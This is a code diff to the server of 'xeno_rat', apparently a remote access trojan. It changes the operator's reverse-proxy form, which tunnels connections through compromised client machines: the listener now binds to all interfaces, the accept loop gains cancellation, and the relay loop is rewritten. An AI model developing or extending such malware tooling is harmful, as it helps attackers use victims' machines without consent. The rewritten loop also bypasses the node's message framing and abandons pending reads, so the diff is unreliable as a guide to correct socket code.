@@ -19,6 +19,7 @@ namespace xeno_rat_server.Forms
     public partial class Reverse_Proxy : Form
     {
         Node client;
+        private CancellationTokenSource _acceptCts;
         public Reverse_Proxy(Node _client)
         {
             InitializeComponent();
@@ -95,22 +96,26 @@ namespace xeno_rat_server.Forms
             {
                 Console.WriteLine("Bind {0}", LOCAL_PORT);
                 sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
-                sock.Bind(new IPEndPoint(IPAddress.Parse(LOCAL_ADDR), LOCAL_PORT));
+
+                // bind to all interfaces so other machines can connect during tests
+                sock.Bind(new IPEndPoint(IPAddress.Any, LOCAL_PORT));
             }
             catch (SocketException ex)
             {
                 Console.WriteLine("Bind failed: {0}", ex.Message);
-                sock.Close(0);
+                sock.Close();
                 return false;
             }
 
             try
             {
-                sock.Listen(1);
+                // increase backlog to 100
+                sock.Listen(100);
             }
-            catch
+            catch (Exception ex)
             {
-                sock.Close(0);
+                Console.WriteLine("Listen failed: " + ex);
+                sock.Close();
                 return false;
             }
 
@@ -465,43 +470,47 @@ namespace xeno_rat_server.Forms
         /// </remarks>
         private async Task RecvSendLoop(Socket client_sock, Node subnode, int bufferSize)
         {
-            while (button2.Enabled && client_sock.Connected && subnode.Connected() && new_socket != null)
+            var clientStream = new NetworkStream(client_sock, ownsSocket: false);
+            try
             {
-                try
+                var subnodeSocket = subnode.sock.sock;
+                var subnodeStream = new NetworkStream(subnodeSocket, ownsSocket: false);
+
+                var clientBuffer = new byte[bufferSize];
+                var subnodeBuffer = new byte[bufferSize];
+
+                while (button2.Enabled && client_sock.Connected && subnode.Connected() && new_socket != null)
                 {
-                    await Task.WhenAny(
-                           Task.Run(() => client_sock.Poll(1000, SelectMode.SelectRead)),
-                           Task.Run(() => subnode.sock.sock.Poll(1000, SelectMode.SelectRead))
-                       );
-                    if (client_sock.Available > 0)
+                    // create two receive tasks
+                    var clientReadTask = clientStream.ReadAsync(clientBuffer, 0, bufferSize);
+                    var subnodeReadTask = subnodeStream.ReadAsync(subnodeBuffer, 0, bufferSize);
+
+                    var completed = await Task.WhenAny(clientReadTask, subnodeReadTask);
+
+                    if (completed == clientReadTask)
                     {
-                        byte[] buffer = new byte[bufferSize];
-                        int bytesRead = await client_sock.ReceiveAsync(new ArraySegment<byte>(buffer), SocketFlags.None);
-                        if (bytesRead == 0)
-                        {
-                            return;
-                        }
-
-                        await subnode.SendAsync(buffer.Take(bytesRead).ToArray());
-
+                        int bytesRead = clientReadTask.Result;
+                        if (bytesRead == 0) return;
+                        await subnode.SendAsync(clientBuffer.Take(bytesRead).ToArray());
                     }
-
-                    if (subnode.sock.sock.Available > 0)
+                    else
                     {
-                        byte[] data = await subnode.ReceiveAsync();
-                        if ((await client_sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) == 0)
-                        {
-                            return;
-                        }
+                        int bytesRead = subnodeReadTask.Result;
+                        if (bytesRead == 0) return;
+                        int sent = await client_sock.SendAsync(new ArraySegment<byte>(subnodeBuffer, 0, bytesRead), SocketFlags.None);
+                        if (sent == 0) return;
                     }
-                    await Task.Delay(100);
-                }
-                catch 
-                {
-                    return;
                 }
             }
-
+            catch (Exception ex)
+            {
+                Console.WriteLine("RecvSendLoop error: " + ex);
+            }
+            finally
+            {
+                try { client_sock.Shutdown(SocketShutdown.Both); } catch { }
+                try { client_sock.Close(); } catch { }
+            }
         }
 
         /// <summary>
@@ -534,22 +543,56 @@ namespace xeno_rat_server.Forms
         /// If an exception occurs during the acceptance of a connection, the method continues to accept new connections.
         /// Once the <see cref="button2"/> is disabled, the method stops accepting new connections and awaits the asynchronous disconnection of the <paramref name="new_socket"/>.
         /// </remarks>
-        private async Task AcceptLoop(Socket new_socket)
+        private async Task AcceptLoop(Socket new_socket, CancellationToken token = default)
         {
-            while (button2.Enabled)
+            try
             {
-                try
+                while (!token.IsCancellationRequested && button2.Enabled)
                 {
-                    Socket socks_client = await new_socket.AcceptAsync();
-                    HandleProxyCreation(socks_client);
-                }
-                catch
-                {
-                    continue;
+                    try
+                    {
+                        // We use AcceptAsync() (no token) for compatibility on frameworks
+                        var acceptTask = new_socket.AcceptAsync();
+                        // Wait either for accept or cancellation
+                        var completed = await Task.WhenAny(acceptTask, Task.Delay(Timeout.Infinite, token));
+                        if (completed != acceptTask)
+                        {
+                            // cancellation requested
+                            break;
+                        }
+
+                        Socket socks_client = acceptTask.Result;
+                        _ = Task.Run(async () =>
+                        {
+                            try
+                            {
+                                await HandleProxyCreation(socks_client).ConfigureAwait(false);
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine($"HandleProxyCreation error: {ex}");
+                                try { socks_client.Shutdown(SocketShutdown.Both); } catch { }
+                                socks_client.Close();
+                            }
+                        }, token);
+                    }
+                    catch (OperationCanceledException) when (token.IsCancellationRequested)
+                    {
+                        break;
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("AcceptAsync failed: " + ex);
+                        await Task.Delay(200).ConfigureAwait(false);
+                    }
                 }
             }
-            await DisconnectSockAsync(new_socket);
+            finally
+            {
+                await DisconnectSockAsync(new_socket).ConfigureAwait(false);
+            }
         }
+
 
         /// <summary>
         /// Handles the button click event to create and bind a socket to the specified port, and start an accept loop on a new thread.
@@ -579,7 +622,8 @@ namespace xeno_rat_server.Forms
             }
             button1.Enabled = false;
             button2.Enabled = true;
-            new Thread(async ()=>await AcceptLoop(new_socket)).Start();
+            _acceptCts = new CancellationTokenSource();
+            _ = Task.Run(() => AcceptLoop(new_socket, _acceptCts.Token));
         }
 
         /// <summary>
@@ -603,6 +647,7 @@ namespace xeno_rat_server.Forms
                 new_socket.Close(0);
                 new_socket = null;
             }
+            _acceptCts?.Cancel();
             button1.Enabled = true;
             button2.Enabled = false;
 
